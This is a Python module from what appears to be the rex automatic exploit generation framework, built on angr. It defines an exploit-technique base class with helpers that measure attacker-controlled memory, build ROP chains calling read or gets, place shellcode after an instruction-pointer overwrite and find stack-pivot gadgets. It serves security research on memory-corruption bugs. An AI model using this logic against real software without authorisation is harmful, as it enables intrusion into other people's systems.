import logging
import simuvex
from rex.exploit import CannotExploit
from angrop.errors import RopException

l = logging.getLogger("rex.exploit.technique")

class Technique(object):
    '''
    Represents an exploit techinue
    '''

    applicable_to = [ ]

    def __init__(self, crash, rop, shellcode):
        '''
        :param crash: a crash object representing the state at crash time
        :param rop: an angr rop object for finding and requesting chains
        :param shellcode: a shellcode manager to query for shellcode
        '''

        self.crash = crash.copy()
        self.rop = rop
        self.shellcode = shellcode

    def apply(self, **kwargs):
        '''
        Applies the exploit technique to the crashing state, returns a working Exploit object
        or raises a CannotExploit exception
        :return: an Exploit object
        '''

        raise NotImplementedError


### EXPLOIT HELPERS ###

    def _stack_control(self):
        '''
        determine what symbolic memory we control equal to or beneath sp
        '''

        control = { }

        if self.crash.state.se.symbolic(self.crash.state.regs.sp):
            l.warning("detected symbolic sp when guaging stack control")
            return control

        sp = self.crash.state.se.any_int(self.crash.state.regs.sp)
        for addr in self.crash.symbolic_mem:
            # if the region is above sp it gets added
            if addr > sp:
                control[addr] = self.crash.symbolic_mem[addr]

            # if sp falls into the region it gets added starting at sp
            if sp < addr + self.crash.symbolic_mem[addr]:
                control[sp] = addr + self.crash.symbolic_mem[addr] - sp

        return control


    def _global_control(self):
        '''
        determine what symbolic memory we control which is at a constant address
        '''

        control = { }

        # PIE binaries will give no global control without knowledge of the binary base
        if self.crash.project.loader.main_bin.pic:
            return control

        min_addr = self.crash.project.loader.main_bin.get_min_addr()
        max_addr = self.crash.project.loader.main_bin.get_max_addr()
        for addr in self.crash.symbolic_mem:
            if addr >= min_addr and addr < max_addr:
                control[addr] = self.crash.symbolic_mem[addr]

        return control

    def _write_global_data(self, data):
        '''
        write @data into globally addressable memory
        :return: tuple of the address of the string and the constraint which adds the string
        '''
        glob_control = self._global_control()

        # try all variations of commands at every global address
        for base in glob_control:
            for addr in range(base, base+glob_control[base]):
                constraint = self.crash.state.memory.load(addr, len(data)) == self.crash.state.se.BVV(data)
                if self.crash.state.se.satisfiable(extra_constraints=(constraint,)):
                    data_str_addr = addr
                    data_str_constraint = constraint
                    return (data_str_addr, data_str_constraint)

        return (None, None)

    def _find_global_address_for_string(self, data):
        return self.crash.project.loader.main_bin.get_max_addr() - len(data)

    def _read_in_global_data(self, data):
        '''
        call a read with with rop into globally addressable memory
        '''

        # turn off file size limit
        self.crash.state.posix.files[0].size = None

        # first try doing it with a call to read
        addr, cons = self._read_in_global_data_with_read(data)
        if not addr is None:
            return addr, cons

        # next try it with a call to gets
        addr, cons = self._read_in_global_data_with_gets(data)
        if not addr is None:
            return addr, cons

        return None, None

    def _read_in_global_data_with_read(self, data):
        '''
        use the linked function read to read in more global data
        :return: tuple of the address and constraints to add
        '''

        addr = self._find_func_address("read")
        # failed to find address
        if addr is None:
            return None, None

        # sanity check this address
        read_to = self._find_global_address_for_string(data)

        # TODO add an option for preferred file descriptor here
        try:
            chain = self.rop.func_call(addr, [0, read_to, len(data)])
        except RopException:
            return None, None

        # check if the chain can exist
        chain, chain_addr = self._ip_overwrite_with_chain(chain)

        # constrain the address to be the chain
        chain_mem = self.crash.state.memory.load(chain_addr, len(chain.payload_str()))
        chain_bvv = self.crash.state.se.BVV(chain.payload_str())
        # the chain should be guaranteed to be satisfiable here
        self.crash.state.add_constraints(chain_mem == chain_bvv)

        # TODO make sure we can still read an unconstrained successor
        # windup the state to introduce the new bytes and fix up the state for insert other chains
        self._windup_to_unconstrained_successor()

        glob_data = self.crash.state.memory.load(read_to, len(data))
        data_bvv  = self.crash.state.se.BVV(data)
        return read_to, (glob_data == data_bvv)

    def _read_in_global_data_with_gets(self, data):
        '''
        use the linked function gets to read in more global data
        :return: tuple of the address and constraints to add
        '''

        addr = self._find_func_address("gets")
        # failed to find address
        if addr is None:
            return None, None

        # sanity check this address
        read_to = self._find_global_address_for_string(data)

        # TODO add an option for preferred file descriptor here
        try:
            chain = self.rop.func_call(addr, [read_to])
        except RopException:
            return None, None

        # check if the chain can exist
        chain, chain_addr = self._ip_overwrite_with_chain(chain)

        # constrain the address to be the chain
        chain_mem = self.crash.state.memory.load(chain_addr, len(chain.payload_str()))
        chain_bvv = self.crash.state.se.BVV(chain.payload_str())
        # the chain should be guaranteed to be satisfiable here
        self.crash.state.add_constraints(chain_mem == chain_bvv)

        # TODO make sure we can still read an unconstrained successor
        # windup the state to introduce the new bytes and fix up the state for insert other chains
        self._windup_to_unconstrained_successor()

        glob_data = self.crash.state.memory.load(read_to, len(data))
        data_bvv  = self.crash.state.se.BVV(data)
        return read_to, (glob_data == data_bvv)

    def _find_func_address(self, symbol):
        '''
        find the address of a function given it's name @symbol
        :param symbol: function name to lookup
        :return: the function's address or None if the function is not present
        '''

        address = None
        symobj = self.crash.project.loader.main_bin.get_symbol(symbol)
        if symbol in self.crash.project.loader.main_bin.plt:
            address = self.crash.project.loader.main_bin.plt[symbol]
        elif symobj is not None:
            address = symobj.addr + self.crash.project.loader.main_bin.rebase_addr

        return address

    def _windup_to_unconstrained_successor(self, path=None):
        '''
        windup of the state of the crash to the first unconstrained successor
        '''

        if path is None:
            p = self.crash.project.factory.path(state=self.crash.state)
        else:
            p = path

        successors = p.step()
        if len(p.unconstrained_successors) != 1:
            return self._windup_to_unconstrained_successor(path=successors[0])

        # extend the prev actions path the actions encountered
        self.crash.added_actions.extend(p.unconstrained_successors[0].actions.hardcopy)
        self.crash.state = p.unconstrained_successors[0].state

    def _ip_overwrite_call_shellcode(self, shellcode):
        '''
        exploit an ip overwrite with shellcode
        :param shellcode: shellcode to call
        '''

        # TODO inspect register state and see if any registers are pointing to symbolic memory
        # if any registers are pointing to symbolic memory look for gadgets to call or jmp there

        # accumulate valid memory, this depends on the os and memory permissions
        valid_memory = { }

        # XXX don't handle ASLR elegantly at the moment, maybe when angr supports it we can query a page for randomness
        if not self.crash.aslr or self.crash.os == "cgc":
            for mem in self.crash.symbolic_mem:
                # ask if the mem is executable
                prots = self.crash.state.memory.permissions(mem)
                if self.crash.state.se.any_int(prots) & 4: # PROT_EXEC is 4
                    valid_memory[mem] = self.crash.symbolic_mem[mem]

        # XXX linux special case, bss is executable if the stack is executable
        if self.crash.project.loader.main_bin.execstack and self.crash.os == "unix":
            valid_memory.update(self._global_control())

        for mem in valid_memory:
            for mem_start in xrange(mem, mem+valid_memory[mem]-len(shellcode)):

                shc_constraints = [ ]

                shc_constraints.append(self.crash.state.regs.ip == mem_start)

                sym_mem = self.crash.state.memory.load(mem_start, len(shellcode))
                shc_bvv = self.crash.state.se.BVV(shellcode)
                shc_constraints.append(sym_mem == shc_bvv)

                if self.crash.state.satisfiable(extra_constraints=shc_constraints):
                    return mem_start

        raise CannotExploit("no place to fit shellcode")

    def _ip_overwrite_with_chain(self, chain, state=None):
        '''
        exploit an ip overwrite using rop
        :param chain: rop chain to use
        :param state: an optionally state to work off of
        :return: a tuple containing a new constrained chain and the address to place the chain
        '''

        if state is None:
            state = self.crash.state

        sp = state.se.any_int(state.regs.sp)

        # first let's see what kind of stack control we have
        symbolic_stack = self._stack_control()
        if len(symbolic_stack) == 0:
            l.warning("no controlled data beneath stack, need to resort to shellcode")
            raise CannotExploit("no controlled data beneath sp")

        chain_addr = None
        stack_pivot = None
        # loop until we can find a chain which gets us to our setter gadget
        for addr in symbolic_stack:
            # increase payload length by wordsize for the final ip hijack
            chain_req = chain.payload_len + self.crash.project.arch.bytes

            # is the space too small?
            if not symbolic_stack[addr] >= chain_req:
                continue

            # okay we have a symbolic region which fits and is below sp
            # can we pivot there?
            for gadget in self.rop.gadgets:
                # let's make sure the gadget is sane

                # TODO: consult state before throwing out a gadget, some of these memory
                # accesses might be acceptable
                if len(gadget.mem_changes + gadget.mem_writes + gadget.mem_reads) > 0:
                    continue

                # if we assume all gadgets end in a 'ret' we can subtract 4 from the stack_change
                # as we're not interested in the ret's effect on stack movement, because when the
                # ret executes we'll have chain control
                jumps_to = sp + (gadget.stack_change - self.crash.project.arch.bytes)
                # does it hit the controlled region?
                if jumps_to >= addr and jumps_to < addr + symbolic_stack[addr]:
                    # it lands in a controlled region, but does our chain fit?
                    offered_size = symbolic_stack[addr] - (jumps_to - addr)
                    if offered_size >= chain_req:
                        # we're in!
                        chain_addr = jumps_to
                        stack_pivot = gadget

                        scratch = state.copy()
                        chain_cp = chain.copy()

                        # test to see if things are still satisfiable
                        chain_constraints = [ ]

                        chain_constraints.append(state.regs.ip == stack_pivot.addr)

                        # TODO: update rop to make this possible without refering to internal vars
                        # we constrain our rop chain to being equal to our payload, preventing the chain builder
                        # from putting illegal characters into positions we don't care about
                        for cons in chain_cp._blank_state.se.constraints:
                            scratch.add_constraints(cons)

                        chain_bytes = chain_cp._blank_state.memory.load(chain_cp._blank_state.regs.esp, chain_cp.payload_len)
                        payload_bytes = scratch.memory.load(chain_addr, chain.payload_len)

                        scratch.add_constraints(chain_bytes == payload_bytes)

                        chain_cp._blank_state = scratch

                        mem = state.memory.load(chain_addr, chain_cp.payload_len)

                        try:
                            cbvv = state.se.BVV(chain_cp.payload_str())
                        except simuvex.SimUnsatError:
                            # it's completely possibly that the values we need need in the chain can't exist due to
                            # constraints on memory, for example if we need the value '1' to exist in our chain, when
                            # our chain enter the process memory space with a 'strcpy', '1' cannot exist because its
                            # value will contain null bytes
                            continue # the chain itself cannot exist here

                        chain_constraints.append(mem == cbvv)

                        # if the chain can't be placed here, let's try again
                        if not state.satisfiable(extra_constraints=chain_constraints):
                            continue

                        # constrain eip to equal the stack_pivot
                        state.add_constraints(state.regs.ip == stack_pivot.addr)
                        return chain_cp, chain_addr

        raise CannotExploit("unable to insert chain")
